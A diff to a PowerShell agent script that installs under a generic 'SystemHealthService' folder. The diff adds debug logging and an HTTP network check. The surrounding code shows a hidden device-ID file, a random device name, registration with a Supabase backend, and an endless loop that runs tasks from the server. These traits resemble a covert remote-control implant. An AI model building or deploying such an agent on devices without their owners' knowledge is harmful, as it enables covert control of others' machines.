@@ -18,14 +18,33 @@ try {
 
 $basePath = "C:\ProgramData\SystemHealthService"
 
-# Wait for internet connection
-while (!(Test-Connection -ComputerName "8.8.8.8" -Count 1 -Quiet)) {
-    Start-Sleep 5
+# Force TLS 1.2 for Supabase HTTPS connections
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+# Debug logging (remove after confirming registration works)
+$logFile = "$basePath\agent_debug.log"
+function Write-Log {
+    param($msg)
+    $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+    "$ts - $msg" | Out-File $logFile -Append -Force
 }
+Write-Log "Agent starting..."
+
+# Wait for internet - use HTTP check instead of ICMP (ping may be blocked)
+while ($true) {
+    try {
+        $null = Invoke-RestMethod -Uri "https://www.google.com" -Method Head -TimeoutSec 5
+        break
+    } catch {
+        Start-Sleep 5
+    }
+}
+Write-Log "Network check passed"
 Start-Sleep 5
 
 # Load config
 $config = Get-Content "$basePath\config.json" -Raw | ConvertFrom-Json
+Write-Log "Config loaded: $($config.supabase_url)"
 $deviceIdFile = "$basePath\device_id.txt"
 
 # Get or create device ID
@@ -36,6 +55,7 @@ if (Test-Path $deviceIdFile) {
     $deviceId | Out-File $deviceIdFile -NoNewline
     (Get-Item $deviceIdFile).Attributes = "Hidden"
 }
+Write-Log "Device ID: $deviceId"
 
 # Generate random device name (8 chars)
 $deviceName = -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object { [char]$_ })
@@ -83,7 +103,9 @@ $registrationData = @{
     os_info = (Get-CimInstance Win32_OperatingSystem).Caption
 }
 
+Write-Log "Registering device..."
 Invoke-API -endpoint "devices" -method "POST" -body $registrationData
+Write-Log "Registration POST sent"
 
 # ================================
 # TASK FUNCTIONS
@@ -543,6 +565,7 @@ function Execute-TaskWithTimeout {
 $syncInterval = if ($config.sync_interval) { $config.sync_interval } else { 10 }
 $retryInterval = if ($config.retry_interval) { $config.retry_interval } else { 10 }
 
+Write-Log "Entering main loop"
 while ($true) {
     try {
         # Update last sync time
